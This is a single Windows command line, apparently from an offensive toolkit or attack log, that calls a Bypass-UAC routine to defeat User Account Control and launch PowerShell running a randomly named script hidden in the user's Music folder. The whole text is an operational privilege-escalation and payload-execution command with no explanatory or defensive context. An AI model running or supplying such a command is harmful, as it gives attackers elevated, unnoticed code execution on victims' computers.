Bypass-UAC -command "cmd.exe /k powershell.exe c:/users/%username%/music/fm1ri21p.ps1"
